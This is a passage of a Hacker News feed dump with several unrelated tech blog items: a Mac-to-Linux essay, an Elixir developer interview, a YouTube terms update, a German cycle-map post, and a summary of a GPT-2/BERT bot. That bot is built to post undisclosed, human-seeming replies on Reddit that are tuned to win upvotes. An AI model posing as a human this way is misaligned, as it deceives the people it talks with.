<p>Sunshine Contacts is our foundation. When your contacts are organized and truly work, they create a flywheel where scheduling, planning, organizing, and being thoughtful about your relationships becomes infinitely easier. When your contacts are complete, comprehensive, and accurately reflect relationships, you can spend your time building meaningful connections and shared experiences. Our future suite of products will make it effortless to keep in touch with the people in your life on a personal and professional level in a thoughtful way.</p>

<p>This is just the beginning.&nbsp; Sunshine is building a suite of services to solve the common pain points that modern technology hasn’t addressed.</p>

<p>At Sunshine, we strive to make the mundane magical. Our vision is to support your day-to-day life – to eliminate time spent on “technology” and simply make things better.&nbsp; Easier.&nbsp; If this means you save some “screen time” and give more thought to the most important people in your life, then we’ll know we’ve done it right.</p>

<p>We can’t wait to show you what’s next.</p>

<p><i>– Marissa and Enrique</i></p>
</div>
				</div>
				</div></div>]]>
            </description>
            <link>https://sunshine.com/introducing-sunshine/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25147134</guid>
            <pubDate>Thu, 19 Nov 2020 07:43:22 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Mac is losing me]]>
            </title>
            <description>
<![CDATA[
Score 47 | Comments 72 (<a href="https://news.ycombinator.com/item?id=25146808">thread link</a>) | @lawik
<br/>
November 18, 2020 | https://underjord.io/the-mac-is-losing-me.html | <a href="https://web.archive.org/web/*/https://underjord.io/the-mac-is-losing-me.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
        
        <small>2020-11-18</small>
        <p>I’ve been mostly happy using a Mac since I got myself my first computer earned with programmer money. I believe it was a mid 2009 15" MacBook Pro. That was a computer I used at least until 2016 which I consider very decent usable life. At that point I had replaced the hard-drive with an SSD, upgraded the RAM and switched a battery that was worn out. I stopped using it when it just straight died some time in 2016.</p>
<h2 id="my-history-with-the-mac">My history with the Mac</h2>
<p>So what was that computer to me? It was an extremely well-built and solid-feeling piece of aluminium. A cool keyboard backlight. The magsafe charger and a bunch of USB ports. The keyboard and touchpad were best in class. The build quality was better than any laptop I had owned before. Partly because I had only bought the cheap ones before but also because they really were a step above at the time.</p>
<p>I got it primarily on recommendation from a friendly hacker who’s recommendations had never lead me wrong before. He spoke well of the underlying UNIX and the experience of using it. Fast, clean and visually pleasing. I think he mostly really liked the backlit keyboard, very hackerly. His recommendation held true, this computer was very good to me.</p>
<p>I’ve also been the admin on an Xserve server. That was wild. Neat UIs but buggy and finicky as all hell.</p>
<p>Since then I’ve used the second generation Macbook Air (I believe 2nd, first wedge version) at 11". That was a cool little machine and did what it did very nicely.</p>
<p>Hardware aside, MacOS in it’s earlier incarnations on these computers was always a snappy and competent experience. A polished surface which did a bunch of stuff under the hood that generally made it work better than the different Ubuntu desktop environments and various Windows versions I’ve had before. Things like Wifi and even Bluetooth felt good in a way they never had before.</p>
<p>A lot of it was the visual polish and the extremely snappy UI. But in total the experience was just great. Spotlight was glorious. I think my first upgrade was Snow Leopard which was generally a very good update as it focused on performance and stability.</p>
<p>As a developer’s machine it was fast enough, competent enough, got out of the way and the UNIX underpinnings meant I didn’t miss Linux at all. I’ve never been able to really connect with the equivalent powershell stuff in Windows. I guess I just like UNIX.</p>
<p>The only bad thing I can say about my early years of MacBook Pro usage was that the trackpad and the Magic Trackpad I got eventually are probably some of the biggest culprits in some of the RSI-style hand pain I’ve been dealing with. Trackpads are just murder on my hands and I worked loads off of that setup for a number of years. Took a while before I realized that it was trackpad-related.</p>
<p>Beyond that I’ve had some refurb Macs for my wife and assorted family, some 13" MBP for work at one point and then a 15" butterfly touchbar MBP for work. I think that was when I started to feel that Apple was diverging from my preferences in the MBP line.</p>
<h2 id="my-current-experience">My current experience</h2>
<p>That’s the same computer I have and work on now and it is.. fine? Maybe just OK. Not great. I’ve had some keys getting stuck but fixable with canned air. I don’t like the touchbar, it has been between useless and an actual hindrance. The TouchID power button is good though. I don’t like living in dongle-town though I mostly like USB C in the long run.</p>
<p>The reason it has been mostly fine for me is that I keep it on tray mounted on a VESA arm, dangling dongles like a technical octopus and I use external peripherals for input.</p>
<p>It gets really hot and loud and then it performs incredibly poorly. So I guess this is one of the throttliest generations. I think I had the “don’t charge it on the wrong side” problem as well. Some of the CPU shenanigans have calmed down as I installed the Turbo Boost Switcher tool to just disable the Turbo Boost, removing performance for peace and quiet.</p>
<p>As I’ve been using these devices it has become increasingly annoying to figure out how to install “unknown” apps. I need some non-discoverable terminal incantation to get the option to accept installing things that are unsigned. There’s always a new piece getting locked down. And while I think that’s often to the benefit of the average consumer, I’m not that. And I just get more annoyed.</p>
<p>I’ve been frustrated about the uninspiring performance delivered for the incredible brand markup that Apple charges. I don’t mind the computer being expensive if the experience is good and the hardware reasonable. The experience feels like it is slipping, especially for my needs and the hardware has just been getting less impressive to me.</p>
<h2 id="the-hardware">The hardware</h2>
<p>My gaming computer has a Ryzen. For a while I did my dev on that as we had just moved to our house and the office wasn’t finalized. Woof, aside from running Windows as a dev environment which I didn’t enjoy there was some serious upside on that machine.</p>
<p>On the Mac my options are very limited. I can’t get a Ryzen, I can’t get anything modern with Intel or meaningfully upgradable at all. The Mac Pro doesn’t count. It comes underspeced at hilarious prices. I like some of the design decisions but the price-point doesn’t make any kind of sense for me and what I do. I can’t buy an interesting Mac from a performance standpoint.</p>
<p>Or can I? Well, they just announced the M1 chip and ARM Macs are now a fact. I think I might get one at some point. For a travel laptop I don’t think the rest of the industry is ready to fight Apple. Battery life and good bang for buck power might actually keep a Mac in my life for that. But I feel like the general trend is away from what I want. Or I might just use my iPad Pro for that use-case.</p>
<p>I think the M1 will be quite impressive when the benchmarks roll in. I’m sure it will suit many people for real-world use-cases as well. However, from the first presentation on it and the first batch of Macs I don’t feel like the direction is for me. IO was heavily sacrificed. Upgradability is pretty much out the window. These things can be fine for a travel device for me where battery and weight are primary concerns. In that regard the new Air looks pretty good.</p>
<h2 id="the-software">The software</h2>
<p>Beyond that the coming OS, Big Sur, is taking MacOS in a direction I dislike. Catalina was quite messy and felt like it took steps toward walling off the Mac. Big Sur seems even more heavy-handed in that area and finally the M1 can push that even further if Apple feels like it. My trust is eroding on letting Apple set the tone for my computing life.</p>
<p>Don’t get me wrong, I think their approach to this transition is incredibly neat with Rosetta2 and how they are using the bytecode stuff with the App Store and whatnot. And the possibility to run iOS and iPad apps natively could be very useful. But none of this really moves the needle for me.</p>
<h2 id="so-whats-next">So what’s next?</h2>
<p>With my office in the garage as my primary work location I’m looking to transition to a desktop computer with lots of power. It will run Linux. Marking my first major return to desktop linux as a daily driver in a bundle of years. And it will run as light a desktop environment as I can stomach. I just wanted a stupid amount of performance to offset som of the UX niceties I know I will miss or have to customize  on my own.</p>
<p>I’m excited about exercising my development tools on a strong modern CPU rather than the throttled mess my current laptop offers. But I’m not thrilled about this move beyond the hardware aspect. I liked MacOS but I just don’t feel like Apple gives much of a care for the things I care about. And I feel like the software side on the Mac is slipping, consistently.</p>
<p>If they released an expandable Mac that wasn’t ridiculously expensive they would really make me think twice. But that feels unlikely.</p>
<p>So I’ll build myself a monstrous machine that can compensate in raw power for the potential lack of elegance and which offers unbounded flexibility rather than a poorly tended garden that someone keeps trying to wall in.</p>
<p>I’m not happy about it. I’ve generally enjoyed using my Macs. But when someone says “we’ll give you the full experience”, settling into that requires trust. And my trust that Apple and me are in alignment keeps fading.</p>
<p>Also, I’m developing a lot with heavily concurrent workloads. So I really look forward to exercising more cores. 2021, year of the Linux desktop (for me).</p>
<p>If you have thoughts, comments or a hell yeah you want to share about this topic or maybe you want me to cover some specific part of my transition here, let me know either via <a href="mailto:lars@underjord.io">lars@underjord.io</a> or on Twitter <a href="https://twitter.com/lawik">@lawik</a>. My first thoughts and my build might just show up first on my newsletter, so consider signing up for that below. It don’t track. Thanks for reading.</p>

    </article></div>]]>
            </description>
            <link>https://underjord.io/the-mac-is-losing-me.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25146808</guid>
            <pubDate>Thu, 19 Nov 2020 06:29:27 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Elixir Community Voices: Lars Wikman]]>
            </title>
            <description>
<![CDATA[
Score 25 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25146798">thread link</a>) | @lawik
<br/>
November 18, 2020 | https://preslav.me/2020/11/19/elixir-community-voices-lars-wikman/ | <a href="https://web.archive.org/web/*/https://preslav.me/2020/11/19/elixir-community-voices-lars-wikman/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        <div id="post-body"><p>To say that Lars (a.k.a <a href="https://twitter.com/lawik">@lawik</a>) is only, as he describes himself, an “Elixir consultant with too much enthusiasm” will be an understatement. The guy is all over the place, writing software, helping businesses move forward, writing <a href="https://underjord.io/the-beam-marches-forward.html">inspiring stories</a> about the future of the BEAM, and co-hosting <a href="https://devchat.tv/podcasts/elixir-mix/">an Elixir podcast.</a> That is how I first got to know Lars. </p><p>Based in Sweden, Lars started his programming journey by building websites with Notepad, then learning PHP and eventually taking his hobby pro through contract work, a failed startup, a couple of product teams and onward into independent consulting. He lives along the west coast of Sweden - a little way out of the city, where he attempts to grow vegetables with his wife and baby. The baby is terrible at growing vegetables.</p><p>In 2016 Lars discovered Erlang/Elixir, and this changed his view on developing software.</p><h2 id="what-brought-you-to-elixir">What brought you to Elixir?</h2><p><strong>Lars:</strong> At first, it was a bit of hype. I had a colleague who was quite a good talker and he went on at length about the legendary resilience of Erlang and hot updates for buried telephone switches. He spoke very well of Ecto changesets and was generally, very positive about Elixir. I ended up looking at talks about Phoenix. This was when <a href="https://hexdocs.pm/phoenix/channels.html">Channels</a> was the new hotness and just before <a href="https://hexdocs.pm/phoenix/Phoenix.Presence.html">Presence</a> took the keynote stage. Looking at what the community was putting out made me give Elixir a try. When I went into business for myself, I was expecting to do a lot of Python, but I intended to try and get into Elixir.</p><p>I enjoy toying around with Raspberry Pi, so it was just a matter of time before I started playing with <a href="https://www.nerves-project.org/">Nerves</a>. I wanted to use the <a href="https://shop.pimoroni.com/products/inky-what?variant=21214020436051">Inky eInk</a> display with Nerves but the library was only available for Python. So, I decided to make a pure Elixir reimplementation. It proved to be a rabbit hole, but the Nerves community was very welcoming and helpful, and I was sold on Elixir for good. Love that crew!</p><p>I feel like I’ve written <a href="https://underjord.io/why-am-i-interested-in-elixir.html">at</a> <a href="https://underjord.io/why-am-i-still-excited-about-elixir.html">least</a> <a href="https://underjord.io/more-than-one-thing-at-a-time.html">four</a> <a href="https://underjord.io/the-beam-marches-forward.html">blog posts</a> about why I remain interested in and excited by Elixir and the BEAM. I like Python. I understand why people like Node.js but I can’t quite get excited about it. Either you go higher level on top of good abstractions, as the BEAM has, or you go lower level for unconstrained performance and flexibility.</p><h2 id="elixir-and-erlang-differ-significantly-from-other-mainstream-programming-languages-what-did-you-find-most-challenging-when-starting-with-the-stack">Elixir and Erlang differ significantly from other mainstream programming languages. What did you find most challenging when starting with the stack?</h2><p><strong>Lars:</strong> Immutability and the functional programming paradigm. Much of my early code did nothing or only did things by accident because I expected that the Map functions would mutate the map, not return a new one. Grasping map, reduce and all of their derivatives in the Enum module took me a bit. It was an adaptation process.</p><p>I guess it has also taken a while to disentangle <em>use</em>, <em>require</em>, <em>import</em> and <em>alias</em>. I still wouldn’t take bets on my understanding of <em>require</em> ;)</p><p>I’ve found the community incredibly welcoming at every step. I’ll call out <a href="https://twitter.com/nyaray">Emilio Nyaray</a> for helping me with some major refactoring and absorbing idiomatic Elixir. I hope everyone has such a good reception and it feels like the general feel of the community is very positive.</p><h2 id="tell-us-a-bit-about-your-most-recent-project-why-did-you-choose-elixir-for-it">Tell us a bit about your most recent project. Why did you choose Elixir for it?</h2><p><strong>Lars:</strong> A little while ago I made <a href="https://underjord.io/live-server-push-without-js.html">a very silly thing</a>. It is a way to show live information on a web page without using Javascript. Instead, it uses the <a href="https://en.wikipedia.org/wiki/Motion_JPEG">MJPEG</a> video protocol to deliver a new frame whenever the state changes. I used it to implement a live counter.</p><p>I used Plug and some code I found that the Nerves people had put together. The state is managed by a GenServer which keeps track of the connections as they come in, asking for the ”image”. It would add them to the list, render a new frame with some text on it, and send it to everyone connected. &nbsp;That would have been incredibly finicky in most runtimes. In my case, the biggest challenge was hitting the front page of Hacker News, where my Nginx config became a bottleneck for concurrent connections. I might have also needed to tweak my Plug a bit. It all maxed out at 450 or so concurrent connections, and I think it should be able to do way more.</p><p>I am about to add some upgrades to the <a href="https://beambloggers.com/">Beambloggers Webring</a> soon that follow the same vein. I don’t like running a database if I don’t need one. So the MJPEG thing is just in-memory data and a temporary state. I restart it, the connections are gone, and start building up again. Similarly, I want Beambloggers to bring in some fresh information about the different blogs. So I’ll have it run a GenServer that pulls in RSS feeds and parses out some recent items that I can link to. In-memory, background work.</p><p>Such use cases are something I’d hesitate to do in Python, for example. If I build something stateful in Python, I feel like it is bound to leak somewhere. Elixir and Erlang have abstractions that allow me to do such things with confidence.</p><h2 id="you-also-do-elixir-consulting-what-kinds-of-applications-do-your-clients-choose-the-beam-for-as-opposed-to-other-tech-stacks"><br>You also do Elixir consulting. What kinds of applications do your clients choose the BEAM for, as opposed to other tech stacks?</h2><p><strong>Lars: </strong>Distributed applications that run indefinitely. Those line up with the absolute majority of work I’ve ever done. Servers, services, and web applications. If I were building large amounts of CLI tooling, I wouldn’t pick it. If I needed native desktop bindings, I wouldn’t pick it. But generally, I’m in the web application world.</p><p>As the cultural successor to Ruby on Rails, I am seeing Phoenix being used all over the place and quite popular with startups. I have seen a lot of companies picking up Elixir without necessarily knowing much about OTP. I think this is fine, and mostly speaks to the maturity of Phoenix and Ecto that people don’t need to.</p><h2 id="in-the-era-of-kubernetes-and-microservices-where-do-you-see-monolithic-beam-applications-fit-into-the-picture">In the era of Kubernetes and Microservices, where do you see monolithic BEAM applications fit into the picture?</h2><p><strong>Lars:</strong> It is interesting. The way Erlang structures things in multiple <em>applications</em> on a <em>node</em> as part of a <em>cluster</em> brings in some infrastructure concerns. I think some people worry that this unconventional approach is a problem when working in a polyglot environment, for example. I don’t think so. Lots of people put the BEAM in their containers and ship it out to the Kubernetes cluster in the same way as every other stack. Microservices tend to be about the contracts you expose, not the internals of how the application runs. Therefore, the fact you run a BEAM application or even a cluster of BEAM applications as one service is perfectly fine.</p><p>Where I believe much of the power of BEAM is though, is if you don’t rely on microservices and a polyglot-heavy environment. You might then be able to cut off a lot of dead weight. Or at least, manage the complexity using tools you know, rather than write YAML until it goes away. Some of the tools are there by design; others are perhaps, what we should be building in the future. I’ve gotten into it to some extent in my blog post <a href="https://underjord.io/the-beam-marches-forward.html"><em>The BEAM marches forward.</em></a></p><p><br>For an in-between path, I would take a look at <a href="https://www.nomadproject.io/">Nomad</a> which seems to be a slightly lighter Kubernetes competitor that can run things without containers. I think it suits the BEAM very well, as Elixir releases handle many of the perks of containerization. I haven’t tried it but if you do, let me know. I am curious about how Nomad differs from Kubernetes.</p><h2 id="as-someone-listening-to-podcasts-for-over-15-years-i-can-t-help-but-ask-how-does-one-get-the-courage-to-host-a-podcast">As someone listening to podcasts for over 15 years, I can’t help but ask. How does one get the courage to host a podcast?</h2><p><strong>Lars:</strong> I don’t think I’m particularly brave. You should see how uncomfortable I am on ladders.</p><p>I think I picked up a habit of pressing through discomfort partly in my teens and partly running a startup with a mentor of mine. When I was around 14, my dad passed away, essentially a heart attack out of the blue. That experience totally shifted my threshold for pain or discomfort and deeply changed how I approached life. That change in attitude was probably part of why I was keen to do the startup. And the startup led to everything else. Turns out that running a business when I barely knew what I was doing as a technical lead was a constant exercise in being okay with discomfort.</p><p>I don’t recommend overworking. I don’t recommend burning yourself out on a startup. Yet, the discomfort is part of the learning sometimes. If you spend a lot of time outside your comfort zone, you are likely to learn more. Being aware that you are choosing discomfort and staying with it is powerful.</p><p>Oh, a podcast? Well, you get asked on as a guest and enjoy it. And then, when the OG host goes off to start a new one, you get contacted as one of the potential new hosts. And since you try not to worry too much and are willing to tackle discomfort, you fret about it for a bit, ask too many questions, and then give it a shot.</p><p><strong>Lars:</strong> It might feel daunting at first. Don’t feel pressure to understand the BEAM, Erlang, OTP, and all of that good stuff right away. If you are an inexperienced developer, any language can seem imposing. We all end up being beginners when we move over to a new ecosystem. I think we will all be happier if we concede that we will not master everything and will only learn a portion of it. What one should focus on instead is building software well.</p></div>
    </div></div>]]>
            </description>
            <link>https://preslav.me/2020/11/19/elixir-community-voices-lars-wikman/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25146798</guid>
            <pubDate>Thu, 19 Nov 2020 06:27:17 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Ads may now appear on any YouTube video]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 3 (<a href="https://news.ycombinator.com/item?id=25146542">thread link</a>) | @radley
<br/>
November 18, 2020 | https://blog.youtube/news-and-events/updates-to-youtubes-terms-of-service | <a href="https://web.archive.org/web/*/https://blog.youtube/news-and-events/updates-to-youtubes-terms-of-service">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section data-component="yt-paragraph-media" data-media-type="paragraph">
  <div>
    
    <div>
      <div>
        <div><p>We periodically update our Terms of Service to make sure they are clear, easy to understand and meet the needs of our partners, advertisers and viewers. Starting today, we’re rolling out an updated Terms of Service in the United States. These new terms will be effective in countries outside of the United States in mid-year 2021. Please read through the <a href="https://www.youtube.com/t/terms">updated terms</a> carefully, they include the following changes.</p><p>First, our Terms of Service already expressly state that you are not allowed to “collect or harvest any information that might identify a person (for example, usernames), unless permitted by that person.” This has always included facial recognition data, and with today’s updated Terms of Service, we are making that explicitly clear.</p><p>Second, ads can now appear on videos from channels not in the YouTube Partner Program (YPP), and we will begin gradually placing ads on brand safe videos. This is part of our ongoing investments in new solutions, like Home Feed ads, that help advertisers responsibly tap into the full scale of YouTube to connect with their audiences and grow their businesses. Advertisers will continue to have full access to our brand suitability controls. Over the past three years, we improved our ability to identify appropriate placements for advertisers, in part by working closely with our advertising partners and <a href="https://wfanet.org/knowledge/item/2020/09/23/WFA-and-platforms-make-major-progress-to-address-harmful-content">industry organizations</a>. Because these channels are not in YPP, there is no creator revenue share, but creators can still apply to YPP once they hit the <a href="https://support.google.com/youtube/answer/72851?hl=en">eligibility criteria</a>, which remains the same.</p><p>Finally, for U.S. creators in YPP, our updated Terms state that any revenue payments from YouTube will now be treated as royalties from a U.S. tax perspective, and that Google will withhold taxes from these payments if it is required by law. U.S. creators will generally be unaffected by these withholding taxes as long as they provide valid tax documentation in <a href="https://support.google.com/adsense/answer/2490070?hl=en">Adsense</a>. For creators outside of the U.S., we will provide more details in 2021 as the terms become available in their countries.</p><p>You can view the previous Terms of Service and how it compares with this update in our <a href="https://yt.be/help/ToS20">help forum</a>.</p></div>
      </div>
      
    </div>
  </div>
</section></div>]]>
            </description>
            <link>https://blog.youtube/news-and-events/updates-to-youtubes-terms-of-service</link>
            <guid isPermaLink="false">hacker-news-small-sites-25146542</guid>
            <pubDate>Thu, 19 Nov 2020 05:31:49 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Building a Realistic Reddit AI That Gets Upvoted]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25146048">thread link</a>) | @optimalsolver
<br/>
November 18, 2020 | https://paulvanderlaken.com/2020/02/10/python-generate-realistic-reddit-ai-upvoted/ | <a href="https://web.archive.org/web/*/https://paulvanderlaken.com/2020/02/10/python-generate-realistic-reddit-ai-upvoted/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content">
	<div id="primary">
		<main id="main" role="main">

		
			
<article id="post-8640">
	<img width="939" height="525" src="https://paulvanderlaken.files.wordpress.com/2020/02/gpt2_bert_workflow1.png?w=939&amp;h=525&amp;crop=1" alt="Building a realistic Reddit AI that get upvoted in&nbsp;Python" loading="lazy" srcset="https://paulvanderlaken.files.wordpress.com/2020/02/gpt2_bert_workflow1.png 939w, https://paulvanderlaken.files.wordpress.com/2020/02/gpt2_bert_workflow1.png?w=150&amp;h=84&amp;crop=1 150w, https://paulvanderlaken.files.wordpress.com/2020/02/gpt2_bert_workflow1.png?w=300&amp;h=168&amp;crop=1 300w, https://paulvanderlaken.files.wordpress.com/2020/02/gpt2_bert_workflow1.png?w=768&amp;h=429&amp;crop=1 768w" sizes="(max-width: 939px) 100vw, 939px" data-attachment-id="8643" data-permalink="https://paulvanderlaken.com/2020/02/10/python-generate-realistic-reddit-ai-upvoted/gpt2_bert_workflow1/" data-orig-file="https://paulvanderlaken.files.wordpress.com/2020/02/gpt2_bert_workflow1.png" data-orig-size="939,525" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="gpt2_bert_workflow[1]" data-image-description="" data-medium-file="https://paulvanderlaken.files.wordpress.com/2020/02/gpt2_bert_workflow1.png?w=300" data-large-file="https://paulvanderlaken.files.wordpress.com/2020/02/gpt2_bert_workflow1.png?w=939">
	<!-- .entry-header -->

	<div>
		
<p>Sometimes I find these AI / programming hobby projects that I just wished I had thought of… </p>



<p><a href="https://www.linkedin.com/in/willstedden/"><strong>Will Stedden</strong></a> combined OpenAI’s <strong><a href="https://openai.com/blog/better-language-models/">GPT-2</a></strong> deep learning text generation model with another deep-learning language model by Google called <strong><a href="https://towardsdatascience.com/bert-explained-state-of-the-art-language-model-for-nlp-f8b21a9b6270">BERT</a></strong> (Bidirectional Encoder Representations from Transformers) and created an elaborate architecture that had one purpose: <strong><em>posting the best replies on Reddit.</em></strong></p>



<p>The architecture is shown at the end of this post — copied from Will’s original blog<em> <a href="https://www.bonkerfield.org/2020/02/combining-gpt-2-and-bert/">here</a></em>. Moreover, you can read&nbsp;<a href="https://www.bonkerfield.org/2020/02/reddit-bot-gpt2-bert/">this post</a>&nbsp;for details regarding the construction of the system. But let me see whether I can explain you what it does in simple language. </p>



<p>The below is what a Reddit comment and reply thread looks like. We have <em>str8cokane </em>making a comment to an original post (not in the picture), and then <em>tupperware-party</em> making a reply to that comment, followed by another reply by <em>str8cokane</em>. Basically, Will wanted to create an AI/bot that could write replies like <em>tupperware-party</em> that real people like <em>str8cokane</em> would not be able to distinguish from “real-people” replies.</p>



<p>Note that with 4 <strong>points</strong>, <em>str8cokane</em>‘s original comments was <em><strong>“liked”</strong></em> more than <em>tupperware-party</em>‘s reply and <em>str8cokane</em>‘s next reply, which were only <strong><em>upvoted </em></strong>2 and 1 times respectively.</p>



<figure><img src="https://www.bonkerfield.org/assets/images/2020/tupperware-party3.png" alt="gpt2-bert on China"><figcaption>Example reddit comment and replies (via <a href="https://www.bonkerfield.org/2020/02/combining-gpt-2-and-bert/">bonkerfield.org/</a>)</figcaption></figure>



<p>So here’s what the final architecture looks like, and my attempt to explain it to you.</p>



<ol><li>Basically, we start in the upper left corner, where Will uses a database (i.e. <em>corpus</em>) of Reddit comments and replies to fine-tune a standard, pretrained GPT-2 model to get it to be good at <strong>generating (red: “fake”) realistic Reddit replies</strong>. </li><li>Next, in the upper middle section, these fake replies are piped into a standard, pretrained BERT model, along with the original, real Reddit comments and replies. This way the BERT model sees both real and fake comments and replies. Now, <strong>our goal is to make replies that are undistinguishable from real replies</strong>. Hence, this is the task the BERT model gets. And we keep fine-tuning the original GPT-2 generator until the BERT discriminator that follows is no longer able to distinguish fake from real replies. Then the generator is “fooling” the discriminator, and we know we are generating fake replies that look like real ones! <br><em>You can find more information about such generative adversarial networks <a href="https://paulvanderlaken.com/2017/10/30/generative-adversarial-networks-gan-explained/">here</a>.</em></li><li>Next, in the top right corner, we fine-tune another BERT model. This time we give it the original Reddit comments and replies along with the amount of times they were upvoted (i.e. sort of like likes on facebook/twitter). Basically, we train a BERT model to <strong>predict for a given reply, how much likes it is going to get</strong>.</li><li>Finally, we can go to production in the lower lane. We give a real-life comment to the GPT-2 generator we trained in the upper left corner, which produces several fake replies for us. These candidates we run through the BERT discriminator we trained in the upper middle section, which determined which of the fake replies we generated look most real. Those fake but realistic replies are then input into our trained BERT model of the top right corner, which predicts for every fake but realistic reply the amount of likes/upvotes it is going to get. Finally, <strong>we pick and reply with the fake but realistic reply that is predicted to get the most upvotes!</strong></li></ol>



<figure><p><a href="https://www.bonkerfield.org/assets/images/2020/gpt2_bert_workflow.png"><img src="https://www.bonkerfield.org/assets/images/2020/gpt2_bert_workflow.png"></a>
</p><figcaption>What Will’s final architecture, combining GPT-2 and BERT, looked like (via <a href="https://www.bonkerfield.org/2020/02/combining-gpt-2-and-bert/">bonkerfield.org</a>)</figcaption></figure>



<p>The results are astonishing! Will’s bot sounds like a real youngster internet troll! Do have a look at <a href="https://www.bonkerfield.org/2020/02/combining-gpt-2-and-bert/">the original blog</a>, but here are some examples. Note that <em>tupperware-party</em> — the Reddit user from the above example — is actually Will’s AI. </p>



<figure><a href="https://www.reddit.com/r/sciencefiction/comments/evqiti/dune_logo_unveiled_at_event_copyright_claimants/fg44yzw/?context=3"><img src="https://www.bonkerfield.org/assets/images/2020/tupperware-party1.png" alt="COMMENT: 'Dune’s fandom is old and intense, and a rich thread in the cultural fabric of the internet generation' BOT_REPLY:'Dune’s fandom is overgrown, underfunded, and in many ways, a poor fit for the new, faster internet generation.'"></a></figure>



<figure><a href="https://www.reddit.com/r/BurningMan/comments/ep6pyq/playa_lung/feilsjn/?context=8&amp;depth=9"><img src="https://www.bonkerfield.org/assets/images/2020/tupperware-party2.png" alt="bot responds to specific numerical bullet point in source comment"></a></figure>



<p>Will ends his blog with <a href="https://www.bonkerfield.org/2020/02/reddit-bot-gpt2-bert/">a link to the tutorial</a> if you want to build such a bot yourself. Have a try!</p>



<p>Moreover, he also notes the ethical concerns:</p>



<blockquote><p>I know there are definitely some ethical considerations when creating something like this. The reason I’m presenting it is because I actually think it is&nbsp;<a href="https://www.wired.com/story/company-wants-billions-make-ai-safe-humanity/">better</a>&nbsp;for more people to know about and be able to grapple with this kind of technology. If just a few people know about the capacity of these machines, then it is more likely that those small groups of people can abuse their advantage.</p><p>I also think that this technology is going to change the way we think about what’s important about being human. After all, if a computer can effectively automate the paper-pushing jobs we’ve constructed and all the bullshit we create on the internet to distract us, then maybe it’ll be time for us to move on to something more meaningful.</p><p>If you think what I’ve done is a problem feel free to&nbsp;email me&nbsp;, or publically shame me on&nbsp;<a href="https://twitter.com/bonkerfield">Twitter</a>.</p><cite>Will Stedden via <a href="https://www.bonkerfield.org/2020/02/combining-gpt-2-and-bert/">bonkerfield.org/2020/02/combining-gpt-2-and-bert/</a></cite></blockquote>








						<!-- .post-categories -->	</div><!-- .entry-content -->

	<!-- .entry-footer -->
</article><!-- #post-## -->
			
<!-- #comments -->
		
		</main><!-- #main -->
	</div><!-- #primary -->


<!-- #secondary -->
	</div></div>]]>
            </description>
            <link>https://paulvanderlaken.com/2020/02/10/python-generate-realistic-reddit-ai-upvoted/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25146048</guid>
            <pubDate>Thu, 19 Nov 2020 03:55:26 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[An ingenious vintage German cycle map (2014)]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25145965">thread link</a>) | @colinprince
<br/>
November 18, 2020 | http://blog.systemed.net/post/10 | <a href="https://web.archive.org/web/*/http://blog.systemed.net/post/10">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>10.</p><div id="text">
				
				<p>We cycled the Swiss part of the Rhine Cycleway last week, with our <a href="https://www.bikefriday.com/bicycles/touring/1248">folding</a> <a href="http://airnimal.eu/products/chameleon/performance-sport/">bikes</a> neatly stowed in suitcases for the flight. A combination of <em><a href="http://cycle.travel/">cycle.travel</a></em> (natch), the Cicerone guide, and the excellent <a href="https://itunes.apple.com/gb/app/mapout/id477094081?l=en&amp;mt=8">MapOut</a> app guided us safely along the way: a very modern combination of mapping styles.</p><p>Wandering around Zürich, waiting for our flight home, I was intrigued by this cycle map in the window of a (closed) antiquarian bookstore:</p><p><img src="http://blog.systemed.net/images/original/strassenprofilkarte_1.jpg"></p><p>And if that isn’t clear enough from the pic snatched through a window, here’s a better excerpt from <a href="http://www.ak-ansichtskarten.de/shop/ak/46/back4684588/Rueckseite-Deutsche-Strassenprofilkarte-fuer-Radfahrer-Strassburg-und-Umgebung-Naumann-s-Fahrraeder-Seidel-Naumann-Dresden.jpg">an example</a> I found online:</p><p><img src="http://blog.systemed.net/images/original/strassenprofilkarte_2.jpg"></p><p>On major climbs, rather than strictly following the two-dimensional curves of the route as a conventional map would do, the map shows a miniature gradient profile for that particular hill.</p><p>Bending geometry to show a subjective view of space is nothing unusual. The Tube map (and its many imitators) famously do it, as do the one-dimensional strip maps that Laurence Penney has <a href="http://www.youshouldliketypetoo.com/blog/misc/one-dimensional-maps/">lovingly curated</a>&nbsp;(and, indeed, one of Laurence’s maps has a <a href="http://www.youshouldliketypetoo.com/wp-content/uploads/2012/12/one-dimensional-maps-14.jpg">passing resemblance</a> to these German sheets). But I’ve never seen quite this approach taken before. It’s a recognition that – just as distance is immaterial to the Tube passenger – to the cyclist, hills are as much part of the ‘distance travelled’ as are the ticking miles on the cycle computer.</p><p>Not that the Radfahrer in question would have had cycle computers, of course. There appear to have been 80 of these sheets, published by&nbsp;Mittelbach's Verlag of Leipzig with the co-operation and support of the national German cycling organisations 